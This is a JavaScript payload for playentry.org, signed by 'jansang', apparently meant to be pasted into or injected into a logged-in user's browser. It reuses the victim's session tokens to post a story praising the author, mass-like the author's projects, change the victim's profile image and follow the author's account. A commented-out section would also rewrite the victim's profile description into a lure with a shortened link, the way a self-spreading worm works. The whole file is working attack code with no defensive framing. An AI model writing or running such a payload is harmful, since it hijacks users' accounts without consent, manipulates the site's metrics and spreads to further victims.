//code made by jansang
fetch("https://playentry.org/graphql", {"headers": {"content-type": "application/json","csrf-token":csrfToken(), "x-token":xToken},"body": "{\"query\":\"\
    mutation CREATE_ENTRYSTORY(\
        \
    $content: String\
    $text: String\
    $image: String\
    $sticker: String\
    $cursor: String\
\
    ) {\
        createEntryStory(\
            \
    content: $content\
    text: $text\
    image: $image\
    sticker: $sticker\
    cursor: $cursor\
\
        ) {\
            warning\
            discuss{\
                \
    id\
    title\
    content\
    seContent\
    created\
    commentsLength\
    likesLength\
    visit\
    category\
    prefix\
    groupNotice\
    user {\
        \
    id\
    nickname\
    username\
    profileImage {\
        \
    id\
    name\
    label {\
        \
    ko\
    en\
    ja\
    vn\
\
    }\
    filename\
    imageType\
    dimension {\
        \
    width\
    height\
\
    }\
    trimmed {\
        filename\
      width\
        height\
    }\
\
    }\
    status {\
        following\
        follower\
    }\
    description\
    role\
\
    }\
    images {\
        filename\
        imageUrl\
    }\
    progress\
    thumbnail\
    reply\
    bestComment {\
        \
    id\
    user {\
        \
    id\
    nickname\
    username\
    profileImage {\
        \
    id\
    name\
    label {\
        \
    ko\
    en\
    ja\
    vn\
\
    }\
    filename\
    imageType\
    dimension {\
        \
    width\
    height\
\
    }\
    trimmed {\
        filename\
        width\
        height\
    }\
\
    }\
    status {\
        following\
        follower\
    }\
    description\
    role\
\
    }\
    content\
    created\
    removed\
    blamed\
    commentsLength\
    likesLength\
    isLike\
    hide\
    image {\
        \
    id\
    name\
    label {\
        \
    ko\
    en\
    ja\
    vn\
\
    }\
   filename\
    imageType\
    dimension {\
        \
    width\
    height\
\
    }\
    trimmed {\
        filename\
        width\
        height\
    }\
\
    }\
    sticker {\
        \
    id\
    name\
    label {\
        \
    ko\
    en\
    ja\
    vn\
\
    }\
    filename\
    imageType\
    dimension {\
        \
    width\
    height\
\
    }\
    trimmed {\
        filename\
        width\
        height\
    }\
\
    }\
\
    }\
    blamed\
\
            }\
        }\
    }\
\",\"variables\":{\"content\":\"잔상님 사랑해요!\"}}","method": "POST",});
fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json","csrf-token":csrfToken(), "x-token":xToken},body:'{"query":"\
    query SELECT_USER_PROJECTS(\
        \
    $user: String!\
    $query: String\
    $categoryCode: String\
    $groupId: ID\
    $pageParam: PageParam\
    $isOpen: Boolean\
    $except: [ID]\
    $searchAfter: JSON\
    $searchType: String\
\
    ) {\
        userProjectList(\
            \
    user: $user\
    query: $query\
    categoryCode: $categoryCode\
    groupId: $groupId\
    pageParam: $pageParam\
    isOpen: $isOpen\
    except: $except\
    searchAfter: $searchAfter\
    searchType: $searchType\
\
    ) {\
            total\
            list {\
                \
    id\
    name\
    user {\
        id\
        username\
        nickname\
        profileImage {\
            id\
            filename\
            imageType\
        }\
    }\
    thumb\
    isopen\
    isPracticalCourse\
    category\
    categoryCode\
    created\
    updated\
    special\
    isForLecture\
    isForStudy\
    isForSubmit\
    hashId\
    complexity\
    staffPicked\
    ranked\
    visit\
    likeCnt\
    comment\
\
            }\
            searchAfter\
        }\
    }\
","variables":{"searchType":"scroll","user":"618237cd602eab013a55bea2","term":"all","pageParam":{"display":122,"sort":"created"}}}',method:"POST"}).then(e=>e.json()).then(e=>{var n=e.data.userProjectList.list;console.log(n),n.forEach(function(e){fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:`{"query":"\
    mutation LIKE($target: String, $targetSubject: String, $targetType: String, $groupId: ID) {\
        like(target: $target, targetSubject: $targetSubject, targetType: $targetType, groupId: $groupId) {\
            \
    target\
    targetSubject\
    targetType\
\
        }\
    }\
","variables":{"target":"${e.id}","targetSubject":"project","targetType":"individual"}}`,method:"POST"})})});
fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json","csrf-token":csrfToken(), "x-token":xToken},body:'{"query":"\
    mutation UPDATE_USERINFO (\
        $profileImage: String, \
        $coverImage: String, \
        $description: String,\
        $nickname: String,\
        $gender: String\
        $mobileKey: String\
    ) {\
        updateUserInfo(\
            profileImage: $profileImage, \
            coverImage: $coverImage, \
            description: $description\
            nickname: $nickname\
            gender: $gender\
            mobileKey: $mobileKey\
        ) {\
            \
    status\
    result\
\
        }\
    }\
","variables":{"profileImage":"628b3920227908de3f5b4867"}}',method:"POST"});
fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\
    mutation FOLLOW(\
        \
    $user: String\
\
    ) {\
        follow(\
            \
    user: $user\
\
        ) {\
            \
    id\
    \
    id\
    user {\
        id\
        username\
        nickname\
        profileImage {\
            \
    id\
    name\
    label {\
        \
    ko\
    en\
    ja\
    vn\
\
    }\
    filename\
    imageType\
    dimension {\
        \
    width\
    height\
\
    }\
    trimmed {\
        filename\
        width\
        height\
    }\
\
        }\
        status {\
            following\
            follower\
        }\
        isFollow\
        projects {\
            id\
            thumb\
            name\
        }\
    }\
\
    \
    id\
    follow {\
        id\
        username\
        nickname\
        profileImage {\
            \
    id\
    name\
    label {\
        \
    ko\
    en\
    ja\
    vn\
\
    }\
    filename\
    imageType\
    dimension {\
        \
    width\
    height\
\
    }\
    trimmed {\
        filename\
        width\
        height\
    }\
\
        }\
        status {\
            following\
            follower\
        }\
        isFollow\
        projects {\
            id\
            thumb\
            name\
        }\
    }\
\
\
        }\
    }\
","variables":{"user":"618237cd602eab013a55bea2"}}',method:"POST"});
/**fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json","csrf-token":csrfToken(), "x-token":xToken},body:'{"query":"\
    mutation UPDATE_USERINFO (\
        $profileImage: String, \
        $coverImage: String, \
        $description: String,\
        $nickname: String,\
        $gender: String\
        $mobileKey: String\
    ) {\
        updateUserInfo(\
            profileImage: $profileImage, \
            coverImage: $coverImage, \
            description: $description\
            nickname: $nickname\
            gender: $gender\
            mobileKey: $mobileKey\
        ) {\
            \
    status\
    result\
\
        }\
    }\
","variables":{"description":"임티닉네임 만드는 방법 ㄷㄷ http://naver.me/G8mOq0Av"}}',method:"POST"});**/
